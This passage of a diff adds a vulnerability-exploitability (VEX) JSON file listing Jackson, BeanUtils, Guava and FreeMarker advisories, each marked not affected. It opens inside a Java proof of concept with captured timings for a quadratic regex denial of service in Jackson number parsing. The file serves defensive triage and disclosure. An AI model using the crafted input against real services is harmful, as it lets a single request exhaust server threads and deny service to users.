NumberInput.looksLikeValidNumber(s);\n            long elapsedMs = (System.nanoTime() - t0) / 1_000_000;\n            timesMs[i] = elapsedMs;\n\n            System.out.printf(\"n=%-8d looksLikeValidNumber=%-6b elapsed=%6d ms%n\", n, result, elapsedMs);\n        }\n\n        System.out.println(\"\\nRatio of elapsed time when n doubles (expect ~2x for linear, ~4x for quadratic):\");\n        boolean quadraticSignatureObserved = false;\n        for (int i = 1; i < sizes.length; i++) {\n            double ratio = timesMs[i - 1] == 0 ? Double.NaN : (double) timesMs[i] / (double) timesMs[i - 1];\n            System.out.printf(\"  n=%d -> n=%d : %dms -> %dms  (ratio=%.2fx)%n\",\n                    sizes[i - 1], sizes[i], timesMs[i - 1], timesMs[i], ratio);\n            if (ratio >= 3.0) quadraticSignatureObserved = true;\n        }\n\n        System.out.println(\"\\nLargest test (n=\" + sizes[sizes.length - 1] + \") took \" + timesMs[timesMs.length - 1]\n                + \" ms for a single call from ONE HTTP-body-sized string.\");\n        System.out.println(\"\\ncom.fasterxml.jackson.core.StreamReadConstraints.DEFAULT_MAX_STRING_LENGTH (20,000,000) \"\n                + \"governs this path, not maxNumberLength (1,000).\");\n\n        if (quadraticSignatureObserved) {\n            System.out.println(\"\\n=> REPRODUCED: superlinear (>=3x per doubling) time growth observed, consistent \"\n                    + \"with quadratic backtracking in PATTERN_FLOAT on non-matching input.\");\n        }\n    }\n\n    static String repeat(char c, int n) {\n        char[] arr = new char[n];\n        java.util.Arrays.fill(arr, c);\n        return new String(arr);\n    }\n}\n```\n\n## Captured Evidence (actual run output)\n\n```\nTiming NumberInput.looksLikeValidNumber(<n ones> + 'x') for growing n:\n\nn=5000     looksLikeValidNumber=false  elapsed=    74 ms\nn=10000    looksLikeValidNumber=false  elapsed=   306 ms\nn=20000    looksLikeValidNumber=false  elapsed=  1157 ms\nn=40000    looksLikeValidNumber=false  elapsed=  4655 ms\nn=80000    looksLikeValidNumber=false  elapsed= 18592 ms\nn=160000   looksLikeValidNumber=false  elapsed= 74393 ms\n\nRatio of elapsed time when n doubles (expect ~2x for linear, ~4x for quadratic):\n  n=5000 -> n=10000 : 74ms -> 306ms  (ratio=4.14x)\n  n=10000 -> n=20000 : 306ms -> 1157ms  (ratio=3.78x)\n  n=20000 -> n=40000 : 1157ms -> 4655ms  (ratio=4.02x)\n  n=40000 -> n=80000 : 4655ms -> 18592ms  (ratio=3.99x)\n  n=80000 -> n=160000 : 18592ms -> 74393ms  (ratio=4.00x)\n\nLargest test (n=160000) took 74393 ms for a single call from ONE HTTP-body-sized string.\n\n=> REPRODUCED: superlinear (>=3x per doubling) time growth observed, consistent with quadratic\nbacktracking in PATTERN_FLOAT on non-matching input.\n```\n\nThis is an unusually clean empirical result: five consecutive doublings each produced a ratio\nbetween 3.78x and 4.14x — matching the theoretical O(n²) prediction (ratio = 4.0x) to within\n5% at every single measurement, leaving essentially no ambiguity about the complexity class.\nExtrapolating this measured curve, a ~1MB string (well within common request body limits) would\ntake on the order of hours for a single call.\n\n## Impact\n\nAny application that coerces a String-typed JSON field to a number (default `jackson-databind`\nbehavior) is exposed: an attacker who can submit a large numeric-looking string (up to\n`maxStringLength`'s default of 20,000,000 characters — far larger than needed given the\nmeasured curve) can pin a request-handling thread for an extended period with a single request.\nBecause the cost scales quadratically, a handful of concurrent moderately-sized requests\n(tens to low hundreds of KB each) is sufficient to exhaust a typical web server's worker thread\npool, denying service to all users.\n\n## Remediation\n\n1. Rewrite `PATTERN_FLOAT` without quantifier ambiguity using possessive quantifiers, e.g.\n   `[+-]?(?:[0-9]++(?:\\.[0-9]*+)?|\\.[0-9]++)(?:[eE][+-]?[0-9]++)?`, which also folds in the\n   trailing-dot case and removes the need for a second full-string scan.\n2. Better: replace the regex entirely with a single-pass hand-written character scan — the same\n   file already contains exactly this pattern for `parseInt`, so the library has both the\n   precedent and the code style available.\n3. Apply an independent length limit (`maxNumberLength`, not the much larger\n   `maxStringLength`) before calling `looksLikeValidNumber()`, closing the four-orders-of-\n   magnitude gap between the two constraints for this specific code path.\n4. Operationally, until fixed: tighten `StreamReadConstraints.maxStringLength` well below its\n   default, and set wall-clock timeouts on parse/coercion operations.",
+      "published": "2026-10-01T15:19:21Z",
+      "updated": "2026-10-01T15:19:23Z",
+      "analysis": {
+        "state": "not_affected",
+        "justification": "code_not_reachable",
+        "detail": "Relates to Jackson processing that cannot be triggered in the product."
+      },
+      "affects": [
+        {
+          "ref": "a74cf8ab-af1f-4946-a6dd-06dfe5e7ee93"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-wxr5-93ph-8wr9",
+      "source": {
+        "name": "GITHUB",
+        "url": "https://github.com/advisories"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "GITHUB",
+            "url": "https://github.com/advisories"
+          },
+          "score": 8.8,
+          "severity": "high",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+        }
+      ],
+      "cwes": [
+        284
+      ],
+      "description": "Improper Access Control vulnerability in Apache Commons.\n\n\n\nA special BeanIntrospector class was added in version 1.9.2. This can be used to stop attackers from using the declared class property of Java enum objects to get access to the classloader. However this protection was not enabled by default. PropertyUtilsBean (and consequently BeanUtilsBean) now disallows declared class level property access by default.\n\n\n\n\n\nReleases 1.11.0 and 2.0.0-M2 address a potential security issue when accessing enum properties in an uncontrolled way. If an application using Commons BeanUtils passes property paths from an external source directly to the getProperty() method of PropertyUtilsBean, an attacker can access the enum’s class loader via the “declaredClass” property available on all Java “enum” objects. Accessing the enum’s “declaredClass” allows remote attackers to access the ClassLoader and execute arbitrary code. The same issue exists with PropertyUtilsBean.getNestedProperty().\nStarting in versions 1.11.0 and 2.0.0-M2 a special BeanIntrospector suppresses the “declaredClass” property. Note that this new BeanIntrospector is enabled by default, but you can disable it to regain the old behavior; see section 2.5 of the user's guide and the unit tests.\n\nThis issue affects Apache Commons BeanUtils 1.x before 1.11.0, and 2.x before 2.0.0-M2.Users of the artifact commons-beanutils:commons-beanutils\n\n 1.x are recommended to upgrade to version 1.11.0, which fixes the issue.\n\n\nUsers of the artifact org.apache.commons:commons-beanutils2\n\n 2.x are recommended to upgrade to version 2.0.0-M2, which fixes the issue.",
+      "published": "2025-05-28T15:34:34Z",
+      "updated": "2025-11-03T21:33:59Z",
+      "analysis": {
+        "state": "not_affected",
+        "justification": "code_not_reachable",
+        "detail": "Imported from OWASP Dependency-Check suppression (cve match): https://github.com/ISAITB/csv-validator/raw/refs/tags/1.12.4/etc/owasp-suppressions.xml [rule purl: ^pkg:maven/commons-beanutils/commons-beanutils@.*$]"
+      },
+      "affects": [
+        {
+          "ref": "b18d126e-48e9-495c-ac60-7e68fbad99a1"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-cxp5-3px4-pw24",
+      "source": {
+        "name": "GITHUB",
+        "url": "https://github.com/advisories"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "GITHUB",
+            "url": "https://github.com/advisories"
+          },
+          "score": 7.5,
+          "severity": "high",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "cwes": [
+        400
+      ],
+      "description": "### Summary\n\nWhen an `@JsonIdentityInfo` collection or map first creates N unresolved\nobject-ID references and later resolves the same IDs in reverse order,\njackson-databind scans the remaining pending-reference accumulator for each\nresolution. A shallow JSON document whose size grows linearly can therefore\ncause quadratic CPU work during deserialization.\n\n### Details\n\nThe affected path is forward-reference completion in\n`CollectionDeserializer.CollectionReferringAccumulator.resolveForwardReference()`\nand the corresponding map implementation. The implementation performs a\nlinear search of the pending accumulator for every resolved object ID.\n\nThe behavior is runtime-confirmed in jackson-databind 2.5.0, 2.22.1, and\n3.2.1. Current 2.22 and 3.2 source branches retained the same design when\nrechecked. A 2.4.0 control fails closed before successful reverse-order\ncompletion, so 2.5.0 is the conservative runtime-confirmed affected floor.\nThe patched versions are: 2.18.11, 2.21.7, 2.22.3, 3.1.7 and 3.2.3.\n\nThe vulnerable application must deserialize attacker-influenced JSON into an\nidentity-enabled collection or map. The issue does not require deep nesting or\nsyntactically unusual JSON.\n\nSuggested correction: replace repeated linear lookup/removal with a keyed\npending-reference structure or another design that provides linear or\namortized-linear completion. A regression should preserve input order,\nduplicate-ID behavior, and unresolved-ID errors while bounding reverse-order\nresolution work.\n\n### PoC\n\nThe proof constructs a shallow collection containing N unresolved\n`@JsonIdentityInfo` references followed by definitions of those same IDs in\nreverse order. Its ID class counts `equals()` calls, giving a deterministic\nwork measure rather than a timing-dependent result.\n\nWith N=2,000, affected versions perform exactly 2,003,000 ID comparisons. An\nequally sized control in which every reference is already resolved performs\nzero comparisons in the pending-reference lookup path. The run is bounded to\na 512 MiB JVM. The result demonstrates quadratic growth: approximately\n`N * (N + 1) / 2` comparisons, plus fixed setup comparisons.\n\n### Impact\n\nAn unauthenticated source that can submit JSON to an application using the\naffected identity-enabled collection or map shape can consume quadratic CPU\nand exhaust a request-time or worker-capacity budget, causing denial of\nservice. The application model/configuration prerequisite is material. No\nconfidentiality, integrity, code-execution, or parser-depth impact is claimed.\n\nRequested credit: Daniel Birtwhistle",
+      "published": "2026-09-30T15:37:24Z",
+      "updated": "2026-09-30T15:37:26Z",
+      "analysis": {
+        "state": "not_affected",
+        "justification": "code_not_present",
+        "detail": "Not applicable: vulnerable code/feature is not used in this product."
+      },
+      "affects": [
+        {
+          "ref": "6f00750b-f22d-4e6f-b508-5d1ab7c7138d"
+        },
+        {
+          "ref": "a230e94c-fad8-4131-9252-3a7b2ffea91f"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-wv8q-qhhj-9h54",
+      "source": {
+        "name": "GITHUB",
+        "url": "https://github.com/advisories"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "GITHUB",
+            "url": "https://github.com/advisories"
+          },
+          "score": 7.5,
+          "severity": "high",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "cwes": [
+        400
+      ],
+      "description": "### Summary\n\nWith `@JsonTypeInfo(use = Id.NAME, defaultImpl = ...)`, every distinct unknown\nraw type ID selects the same fallback deserializer but is retained as a\nseparate key in `TypeDeserializerBase._deserializers`. An attacker who can\nrepeatedly supply new unknown type IDs can grow this process-lifetime cache\nwithout a configured bound.\n\n### Details\n\nThe affected path is `TypeDeserializerBase._findDeserializer()`. After an\nunknown name-based type ID resolves to the configured fallback/default\nimplementation, jackson-databind caches the result under the attacker-provided\nraw `typeId`. Although all such IDs select the same fallback deserializer, each\nnew string remains a distinct cache key.\n\nThe behavior is runtime-confirmed in jackson-databind 2.22.1 and 3.2.1.\nCurrent 2.22 and 3.2 source branches retained the unbounded `_deserializers`\nmap and per-raw-ID cache write when rechecked. The earlier affected floor has\nnot been established, patched versions are: 2.18.11, 2.21.7, 2.22.3, 3.1.7 and 3.2.3.\n\nThe vulnerable application must enable name-based polymorphism with a\n`defaultImpl` or equivalent fallback, accept attacker-influenced type IDs, and\nreuse a long-lived mapper/type deserializer across requests.\n\nSuggested correction: avoid caching each unknown raw ID when every such ID\nresolves to the same fallback, use a fallback sentinel, or use an explicitly\nbounded concurrency-safe cache. A regression should contrast many distinct\nunknown IDs with repetitions of one unknown ID across requests.\n\n### PoC\n\nConfigure a polymorphic base type with\n`@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, defaultImpl = Fallback.class)` and\ndeserialize inputs containing unknown type names through the same mapper.\nInspect `TypeDeserializerBase._deserializers` after the run.\n\nOn affected 2.x and 3.x versions, 10,000 distinct unknown raw type IDs produce\n10,000 retained cache entries even though every input selects the same\nfallback deserializer. A matched control that repeats one unknown ID 10,000\ntimes produces one retained entry. This isolates attacker-controlled key\ncardinality from ordinary request count.\n\n### Impact\n\nWhere the stated polymorphic fallback configuration is exposed to\nattacker-influenced type IDs, distinct inputs cause incremental\nprocess-lifetime memory retention and eventual availability pressure or\ndenial of service. This is not claimed as a single-request allocation spike,\nand no fixed bytes-per-ID or time-to-out-of-memory value is asserted. No\nconfidentiality, integrity, or code-execution impact is claimed.\n\nRequested credit: Daniel Birtwhistle",
+      "published": "2026-09-30T15:36:55Z",
+      "updated": "2026-09-30T15:36:57Z",
+      "analysis": {
+        "state": "not_affected",
+        "justification": "code_not_present",
+        "detail": "Not applicable: vulnerable code/feature is not used in this product."
+      },
+      "affects": [
+        {
+          "ref": "6f00750b-f22d-4e6f-b508-5d1ab7c7138d"
+        },
+        {
+          "ref": "a230e94c-fad8-4131-9252-3a7b2ffea91f"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-5mg8-w23w-74h3",
+      "source": {
+        "name": "GITHUB",
+        "url": "https://github.com/advisories"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "GITHUB",
+            "url": "https://github.com/advisories"
+          },
+          "score": 3.3,
+          "severity": "low",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"
+        }
+      ],
+      "cwes": [
+        173,
+        200,
+        378,
+        732
+      ],
+      "description": "A temp directory creation vulnerability exists in Guava prior to version 32.0.0 allowing an attacker with access to the machine to potentially access data in a temporary directory created by the Guava `com.google.common.io.Files.createTempDir()`. The permissions granted to the directory created default to the standard unix-like /tmp ones, leaving the files open. Maintainers recommend explicitly changing the permissions after the creation of the directory, or removing uses of the vulnerable method.",
+      "published": "2021-03-25T17:04:19Z",
+      "updated": "2026-02-23T22:45:55Z",
+      "analysis": {
+        "state": "not_affected",
+        "justification": "code_not_reachable",
+        "detail": "Imported from OWASP Dependency-Check suppression (cve match): https://github.com/ISAITB/csv-validator/raw/refs/tags/1.12.4/etc/owasp-suppressions.xml [rule purl: ^pkg:maven/com\\.google\\.guava/guava@.*$]"
+      },
+      "affects": [
+        {
+          "ref": "9c607951-42d8-418b-8739-8cb0df23f4fe"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-7g45-4rm6-3mm3",
+      "source": {
+        "name": "GITHUB",
+        "url": "https://github.com/advisories"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "GITHUB",
+            "url": "https://github.com/advisories"
+          },
+          "score": 5.5,
+          "severity": "medium",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
+        }
+      ],
+      "cwes": [
+        379,
+        552
+      ],
+      "description": "Use of Java's default temporary directory for file creation in `FileBackedOutputStream` in Google Guava versions 1.0 to 31.1 on Unix systems and Android Ice Cream Sandwich allows other users and apps on the machine with access to the default Java temporary directory to be able to access the files created by the class.\n\nEven though the security vulnerability is fixed in version 32.0.0, maintainers recommend using version 32.0.1 as version 32.0.0 breaks some functionality under Windows.",
+      "published": "2023-06-14T18:30:38Z",
+      "updated": "2025-11-04T16:44:28Z",
+      "analysis": {
+        "state": "not_affected",
+        "justification": "code_not_reachable",
+        "detail": "Imported from OWASP Dependency-Check suppression (cve match): https://github.com/ISAITB/itb-commons/raw/refs/tags/1.12.4/owasp-suppressions/src/main/resources/eu/europa/ec/itb/owasp-suppressions.xml [rule purl: ^pkg:maven/com\\.google\\.guava/guava@.*$]"
+      },
+      "affects": [
+        {
+          "ref": "9c607951-42d8-418b-8739-8cb0df23f4fe"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-27j2-h3m2-8237",
+      "source": {
+        "name": "GITHUB",
+        "url": "https://github.com/advisories"
+      },
+      "ratings": [
+        {
+          "source": {
+            "name": "GITHUB",
+            "url": "https://github.com/advisories"
+          },
+          "score": 9.1,
+          "severity": "critical",
+          "method": "CVSSv31",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+        }
+      ],
+      "cwes": [
+        23
+      ],
+      "description": "Path traversal vulnerability in Apache FreeMarker template loading mechanism, if the attacker can specify an arbitrary malformed locale identifier to FreeMarker, and the localized lookup configuration setting is enabled (it's by default enabled).\n\nThis issue affects Apache FreeMarker from 2.2.0 through 2.3.34.\n\nUsers are recommended to upgrade to version 2.3.35. Disabling localized lookup in previous versions also mitigates this.\n\nNote that even in versions affected by this vulnerability, the files that can be loaded remain restricted by the TemplateLoader that FreeMarker is configured to use. In particular, FileTemplateLoader prevents attempts to traverse outside the baseDir specified in its constructor. Other TemplateLoader implementations may allow access outside their designated base directory, but they are still constrained by the underlying storage mechanism—for example, a loader wrapping a Java class loader can only access resources that the class loader can load, while one wrapping a web application context can only access resources available through that context.",
+      "published": "2026-09-10T06:31:45Z",
+      "updated": "2026-09-24T19:08:24Z",
+      "analysis": {
+        "state": "not_affected",
+        "justification": "code_not_reachable",
+        "detail": "Freemarker template loading is fully internal and not influenced by user input."
+      },
+      "affects": [
+        {
+          "ref": "a4232f82-0a1d-475f-a3fe-760cee39d3a2"
+        }
+      ]
+    }
+  ]
+}
